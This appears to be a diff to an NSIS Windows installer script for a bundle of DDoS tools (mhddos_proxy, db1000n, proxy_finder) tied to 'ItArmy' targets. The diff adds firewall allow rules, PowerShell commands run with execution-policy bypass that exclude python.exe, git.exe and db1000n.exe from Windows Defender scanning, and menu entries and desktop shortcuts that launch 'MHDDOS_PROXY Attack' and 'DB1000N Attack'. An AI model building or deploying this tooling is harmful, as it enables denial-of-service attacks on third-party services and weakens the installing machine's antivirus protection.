@@ -88,6 +88,19 @@ Section
 SectionEnd
 
 Section
+	;Add firewall&&defender rule
+	nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_python_in" dir=in action=allow program="${PYTHON_DIR}\python.exe" enable=yes"'
+	nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_git_in" dir=in action=allow program="${GIT_DIR}\git.exe" enable=yes"'
+	nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_db1000n_in" dir=in action=allow program="${DB1000N_DIR}\db1000n.exe" enable=yes"'
+	nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_python_out" dir=out action=allow program="${PYTHON_DIR}\python.exe" enable=yes"'
+	nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_git_out" dir=out action=allow program="${GIT_DIR}\git.exe" enable=yes"'
+	nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_db1000n_out" dir=out action=allow program="${DB1000N_DIR}\db1000n.exe" enable=yes"'
+	nsExec::Exec 'cmd /c "powershell -exec bypass -Command Add-MpPreference -ExclusionProcess "python.exe""'
+	nsExec::Exec 'cmd /c "powershell -exec bypass -Command Add-MpPreference -ExclusionProcess "git.exe""'
+	nsExec::Exec 'cmd /c "powershell -exec bypass -Command Add-MpPreference -ExclusionProcess "db1000n.exe""'
+SectionEnd
+
+Section
 	SectionIn RO
 	SetOutPath ${GIT_DIR}
 
@@ -120,6 +133,7 @@ Section ;RUNNER
   FileWrite $9 ":RUN_MHDDOS_PROXY$\r$\n"
   FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-itarmy' goto ITARMY)$\r$\n"
   FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-itarmy_powerfull' goto ITARMY_POWERFULL)$\r$\n"
+  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-itarmy_db1000n' goto ITARMY_DB1000N)$\r$\n"
   ;FileWrite $9 ":RUN_MHDDOS_PROXY_BETA$\r$\n"
   ;FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-itarmy_beta' goto ITARMY_BETA)$\r$\n"
   FileWrite $9 ":RUN_CLONE_MHDDOS_PROXY$\r$\n"
@@ -134,11 +148,15 @@ Section ;RUNNER
   
   FileWrite $9 ":MAIN_INFO$\r$\n"
   FileWrite $9 "ECHO.$\r$\n"
-  FileWrite $9 "ECHO 1. Run ItArmy Attack$\r$\n"
+  FileWrite $9 "ECHO 1. Run MHDDOS_PROXY Attack$\r$\n"
+  FileWrite $9 "ECHO 2. Run DB1000N Attack$\r$\n"
+  FileWrite $9 "ECHO 3. Run proxy_finder$\r$\n"
   ;FileWrite $9 "ECHO 2. Run ItArmy Attack BETA$\r$\n"
   FileWrite $9 "set /p choice=Enter a number to start the action:$\r$\n"
   FileWrite $9 "if '%choice%'=='' ECHO '%choice%'  is not a valid option, please try again$\r$\n"
   FileWrite $9 "if '%choice%'=='1' goto ITARMY$\r$\n"
+  FileWrite $9 "if '%choice%'=='2' goto ITARMY_DB1000N$\r$\n"
+  FileWrite $9 "if '%choice%'=='3' goto proxy_finder$\r$\n"
   ;FileWrite $9 "if '%choice%'=='2' goto ITARMY_BETA$\r$\n"
   FileWrite $9 "goto END$\r$\n"
   
@@ -184,6 +202,12 @@ Section ;RUNNER
   FileWrite $9 "python runner.py $(mhddos_lang) --itarmy --copies auto$\r$\n"
   FileWrite $9 "goto END$\r$\n"
   
+  FileWrite $9 ":ITARMY_DB1000N$\r$\n"
+  FileWrite $9 "CD ${DB1000N_DIR}$\r$\n"
+  FileWrite $9 "ECHO Start DB1000N Attack ItArmy Target$\r$\n"
+  FileWrite $9 "db1000n.exe$\r$\n"
+  FileWrite $9 "goto END$\r$\n"
+  
   ;FileWrite $9 ":ITARMY_BETA$\r$\n"
   ;FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
   ;FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
@@ -226,6 +250,26 @@ Section	"mhddos_proxy";INSTALL MHDDOS_PROXY
   SetOutPath $INSTDIR
  
   nsExec::Exec 'cmd /c "$INSTDIR\runner.bat -clone_mhddos_proxy"'
+  
+  File "resources\itarmy.ico"
+  File "resources\powerfull.ico"
+  
+  CreateShortCut "$DESKTOP\MHDDOS_PROXY.lnk" "$INSTDIR\runner.bat" "-itarmy" "$INSTDIR\itarmy.ico" 0
+  CreateShortCut "$DESKTOP\MHDDOS_PROXY_POWERFULL.lnk" "$INSTDIR\runner.bat" "-itarmy_powerfull" "$INSTDIR\powerfull.ico" 0
+
+SectionEnd
+
+Section	"db1000n"
+  SectionIn RO
+	SetOutPath ${DB1000N_DIR}
+
+	${If} ${RunningX64}
+		File /r "requirements\db1000n\x64\*"
+	${Else}
+		File /r "requirements\db1000n\x86\*"
+	${EndIf}  
+ 
+	CreateShortCut "$DESKTOP\DB1000N.lnk" "$INSTDIR\runner.bat" "-itarmy_db1000n" "$INSTDIR\itarmy_d1000n.ico" 0
 
 SectionEnd
 
@@ -238,17 +282,7 @@ SectionEnd
 ;SectionEnd
 
 ;ItArmy
-Section	$(inst_itarmy_req) ;"ItArm y of Ukraine Attack"
 
-  SetOutPath $INSTDIR
-  
-  File "resources\itarmy.ico"
-  File "resources\powerfull.ico"
-  
-  CreateShortCut "$DESKTOP\$(inst_itarmy_req).lnk" "$INSTDIR\runner.bat" "-itarmy" "$INSTDIR\itarmy.ico" 0
-  CreateShortCut "$DESKTOP\$(inst_itarmy_req)_POWERFULL.lnk" "$INSTDIR\runner.bat" "-itarmy_powerfull" "$INSTDIR\powerfull.ico" 0
-
-SectionEnd
 
 ;ItArmy BETA
 ;Section	/o	$(inst_itarmy_beta_req) ;"ItArmy of Ukraine Attack BETA"
@@ -270,7 +304,7 @@ Section	/o	$(inst_pf_req)
   
   nsExec::Exec 'cmd /c "$INSTDIR\runner.bat -clone_proxy_finder"'
   
-  CreateShortCut "$DESKTOP\$(inst_pf_req).lnk" "$INSTDIR\runner.bat" "-proxy_finder" "$INSTDIR\itarmy_proxy.ico" 0
+  CreateShortCut "$DESKTOP\PROXY_FINDER.lnk" "$INSTDIR\runner.bat" "-proxy_finder" "$INSTDIR\itarmy_proxy.ico" 0
 
 SectionEnd
 
